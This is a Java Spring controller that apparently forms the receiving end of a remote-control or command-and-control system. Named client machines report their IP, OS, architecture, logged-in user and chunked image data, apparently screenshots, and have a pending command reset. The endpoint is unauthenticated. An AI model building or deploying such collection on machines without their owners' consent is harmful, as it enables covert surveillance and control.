package ch.wetwer.hermannapi.controller;

import ch.wetwer.hermannapi.data.Client;
import ch.wetwer.hermannapi.data.repository.ClientRepository;
import ch.wetwer.hermannapi.service.ClientService;
import ch.wetwer.hermannapi.service.ImageService;
import ch.wetwer.hermannapi.service.MessageService;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.Timestamp;
import java.util.Date;

/**
 * @author Wetwer
 * @project hermann-api
 * @package ch.wetwer.hermannapi.controller
 * @created 27.03.2019
 **/

@CrossOrigin
@RestController
@RequestMapping("in")
public class ReceiverController {

    private ClientRepository clientRepository;

    private ClientService clientService;
    private MessageService messageService;
    private ImageService imageService;

    public ReceiverController(ClientRepository clientRepository, ClientService clientService,
                              MessageService messageService, ImageService imageService) {
        this.clientRepository = clientRepository;
        this.clientService = clientService;
        this.messageService = messageService;
        this.imageService = imageService;
    }

    @GetMapping("{pcName}")
    public Boolean getResponse(@PathVariable("pcName") String pcName,
                               @RequestParam("type") String type,
                               @RequestParam("response") String response) {
        Client client = clientService.checkClientName(pcName);

        switch (type) {
            case "imgbytes":
                imageService.addBytes(response);
                break;
            case "imgend":
                messageService.saveMessage("message", imageService.createImg(client), client);
                imageService.clearBytes();
                break;
            case "reset":
                client.setCommand("");
                clientRepository.save(client);
                break;
            case "ip":
                client.setIp(response);
                break;
            case "arch":
                client.setClientArch(response);
                break;
            case "os":
                client.setOs(response);
                break;
            case "user":
                client.setPcUser(response);
                break;
            case "status":
                break;
            default:
                messageService.saveMessage(type, response, client);
                break;
        }

        client.setLastseen(new Timestamp(new Date().getTime()));
        clientRepository.save(client);
        return true;
    }
}
